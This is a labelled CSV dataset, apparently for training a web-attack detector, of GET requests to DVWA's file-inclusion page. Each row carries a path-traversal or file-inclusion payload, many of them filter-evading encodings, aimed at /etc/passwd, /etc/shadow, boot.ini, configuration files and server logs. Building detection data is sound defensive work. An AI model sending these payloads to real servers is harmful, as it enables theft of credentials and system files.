method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=ÀîÀîÁÀîÀîÁÀîÀîÁÀîÀîÁÀîÀîÁÀîÀîÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%bg%qfü€€€€®ü€€€€®%bg%qfü€€€€®ü€€€€®%bg%qfü€€€€®ü€€€€®%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vwindowsÀ%9vsystem32À%9vdriversÀ%9vetcÀ%9vhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%uF025..%uF025{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.?À\.?À\.?À\.?À\.?À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..À\..À\..À\..À\..À\{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..../ð€€¯..../ð€€¯..../ð€€¯..../ð€€¯..../ð€€¯..../ð€€¯etcð€€¯issue,,6,0,0,0,0,6,1,bad
GET,/vulnerabilities/fi/?page=\..À%qf\..À%qf\..À%qf\..À%qf\..À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî/ÀîÀî/ÀîÀî/ÀîÀî/windows/system32/drivers/etc/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9cetc%c1%9cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÀ¯ÀþÀþÀ¯ÀþÀþÀ¯ÀþÀþÀ¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../\../\../\../\windows/\system32/\drivers/\etc/\hosts,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,0,3,2,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.ð€€¯.../.ð€€¯.../.ð€€¯.../.ð€€¯etcð€€¯passwd,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../boot.ini,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/opt/xampp/logs/access.log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/.\..\.\..\.\..\.\..\.\..\.\..\{FILE},,0,6,6,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À.À.ø€€€¯À.À.ø€€€¯À.À.ø€€€¯etcø€€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=///../../../../../{FILE},,5,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=??À%qf??À%qf??À%qf??À%qf??À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\..\..\..\..\..\/etc/passwd;index.html,,0,6,5,3,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁ%pc%c0%ae%c0%aeÁ%pc%c0%ae%c0%aeÁ%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî\ÀîÀî\ÀîÀî\ÀîÀî\ÀîÀî\ÀîÀî\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..//..//,,2,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=à€®à€®À/à€®à€®À/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîð€€¯ÀîÀîð€€¯ÀîÀîð€€¯ÀîÀîð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁ%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\../\../boot.ini,,2,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??Á¯??Á¯??Á¯??Á¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..À¯{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..Á%pc..Á%pc..Á%pc..Á%pc..Á%pc..Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.\À.À.\À.À.\À.À.\À.À.\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%c0%afÀ.À.%c0%afÀ.À.%c0%afÀ.À.%c0%afÀ.À.%c0%afÀ.À.%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcwindowsÁ%pcsystem32Á%pcdriversÁ%pcetcÁ%pchosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??Á¯??Á¯??Á¯??Á¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/./\/././\/././\/././\/./{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?Á%8s.?Á%8s.?Á%8s.?Á%8s.?Á%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??%u2216??%u2216??%u2216??%u2216??%u2216??%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../%u2216..../%u2216..../%u2216..../%u2216etc%u2216issue,,4,0,0,0,0,4,1,bad
GET,/vulnerabilities/fi/?page=.?à€¯windowsà€¯system32à€¯driversà€¯etcà€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..//..//..//..///etc/passwd,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%2fboot.ini,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216ü€€€€®ü€€€€®%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%u22160x2e0x2e%u22160x2e0x2e%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%bg%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../proc/self/environ,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%u2215..%u2215..%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%2%f..%2%f..%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%c0%afð€€®ð€€®%c0%afð€€®ð€€®%c0%afð€€®ð€€®%c0%afð€€®ð€€®%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c0%af0x2e0x2e%c0%afboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%c0%af\..%c0%af\..%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/hostname.bge,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Áœð€€®ð€€®ÁœetcÁœpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^\À^À^\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216%c0%ae%c0%ae%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁ%pcÀþÀþÁ%pcÀþÀþÁ%pcÀþÀþÁ%pcÀþÀþÁ%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..Á%8s\..Á%8setcÁ%8sissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?À%9v.?À%9v.?À%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..%2f\..%2f\..%2f\..%2f\..%2fboot.ini,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%5c\..%5c\..%5c\..%5c\..%5c\..%5cetc%5cissue,,0,6,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®\windows\system32\drivers\etc\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁœ%2e%2eÁœ%2e%2eÁœ%2e%2eÁœ%2e%2eÁœ%2e%2eÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eà€¯%2%e%2%eà€¯%2%e%2%eà€¯%2%e%2%eà€¯%2%e%2%eà€¯%2%e%2%eà€¯etcà€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cü€€€€®ü€€€€®0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c,,0,6,5,3,0,0,0,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%5%c0x2e0x2e%5%c0x2e0x2e%5%c0x2e0x2e%5%c0x2e0x2e%5%c0x2e0x2e%5%cetc%5%cissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../opt/lampp/logs/access.log,,15,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%qfð€€®ð€€®À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/../../../../../../../../../../etc/shadow,,10,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁ%8s%c0%ae%c0%aeÁ%8s%c0%ae%c0%aeÁ%8s%c0%ae%c0%aeÁ%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®0x5cÀ®À®0x5cÀ®À®0x5cÀ®À®0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%u2216..%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:\apache\logs\error_log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^0x2fÀ^À^0x2fÀ^À^0x2fÀ^À^0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../{FILE},,3,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eÁ%8s%2%e%2%eÁ%8s%2%e%2%eÁ%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd,,8,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®%u2216À®À®%u2216À®À®%u2216À®À®%u2216À®À®%u2216À®À®%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/etc/apache/conf/httpd.conf,,0,0,0,0,0,0,7,bad
GET,/vulnerabilities/fi/?page=..///..///..///..///..///..///..///..////etc/passwd,,8,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%c0%af.../.%c0%af.../.%c0%afboot.ini,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%2fÀîÀî%2fetc%2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../Á..../Á..../Á..../Áboot.ini,,4,0,0,0,0,4,1,bad
GET,/vulnerabilities/fi/?page=..Áœ..ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®ð€€¯À®À®ð€€¯À®À®ð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5cetc%5cpasswd,,0,1,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/mysqld.log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eÀ%9v%2%e%2%eÀ%9v%2%e%2%eÀ%9v%2%e%2%eÀ%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À^À^%u2215À^À^%u2215etc%u2215passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁœÀþÀþÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=...\...\boot.ini,,0,2,1,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c,,0,5,4,2,0,0,0,bad
GET,/vulnerabilities/fi/?page=..../%u2215..../%u2215..../%u2215..../%u2215..../%u2215..../%u2215boot.ini,,6,0,0,0,0,6,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eø€€€¯%2%e%2%eø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%2f..../%2f..../%2f..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,4,0,0,0,0,4,2,bad
GET,/vulnerabilities/fi/?page=..À%9v..À%9v..À%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..\..\..\..\..\..\..\..\..\..\etc\passwd,,0,10,9,5,0,0,2,bad
GET,/vulnerabilities/fi/?page=/usr/sbin/pure-config.pl,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=../../../../../var/www/logs/error.log,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../apache/logs/access.log,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^À\À^À^À\À^À^À\À^À^À\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯etcÀ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/qmail,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE},,0,8,7,4,0,0,0,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%uEFC8ÀþÀþ%uEFC8ÀþÀþ%uEFC8ÀþÀþ%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁ¯%2e%2eÁ¯%2e%2eÁ¯%2e%2eÁ¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯windowsà€¯system32à€¯driversà€¯etcà€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^ÁœÀ^À^ÁœÀ^À^ÁœÀ^À^ÁœÀ^À^ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%bg%qf%c0%ae%c0%ae%bg%qf%c0%ae%c0%ae%bg%qf%c0%ae%c0%ae%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..À%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\..\..\..\windows\system32\drivers\etc\hosts,,0,4,3,2,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/\../,,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÁœÀîÀîÁœÀîÀîÁœÀîÀîÁœetcÁœpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Áø€€€®ø€€€®Áø€€€®ø€€€®ÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁœ%ÀnÀnÁœ%ÀnÀnÁœ%ÀnÀnÁœ%ÀnÀnÁœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/etc/php.ini,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=à€®à€®%u2215à€®à€®%u2215à€®à€®%u2215à€®à€®%u2215à€®à€®%u2215à€®à€®%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®0x2fà€®à€®0x2fà€®à€®0x2fà€®à€®0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html,,0,3,2,1,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?%c1%9c.?%c1%9c.?%c1%9c.?%c1%9c.?%c1%9cetc%c1%9cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%2f,,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../var/log/apache2/error.log,,15,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c0%af0x2e0x2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÀ¯%uff0e%uff0eÀ¯%uff0e%uff0eÀ¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Áœü€€€€®ü€€€€®Áœü€€€€®ü€€€€®Áœü€€€€®ü€€€€®ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..%2f..%2f..%2f..%2f..%2fboot.ini,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîð€€¯windowsð€€¯system32ð€€¯driversð€€¯etcð€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},,0,4,3,2,0,0,0,bad
GET,/vulnerabilities/fi/?page=/..\/..\/..\/etc/passwd,,0,3,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ\0x2e0x2eÀ\0x2e0x2eÀ\etcÀ\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®À/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eà€¯%uff0e%uff0eà€¯%uff0e%uff0eà€¯%uff0e%uff0eà€¯etcà€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Á%8s..Á%8s..Á%8s..Á%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cetc%5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À\ü€€€€®ü€€€€®À\ü€€€€®ü€€€€®À\ü€€€€®ü€€€€®À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn0x2f%ÀnÀn0x2f%ÀnÀn0x2f%ÀnÀn0x2f%ÀnÀn0x2f%ÀnÀn0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ/ÀþÀþ/ÀþÀþ/ÀþÀþ/ÀþÀþ/ÀþÀþ/etc/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^0x5cÀ^À^0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®À/à€®à€®À/windowsÀ/system32À/driversÀ/etcÀ/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?/etc/passwd,,0,0,0,0,0,0,2,bad
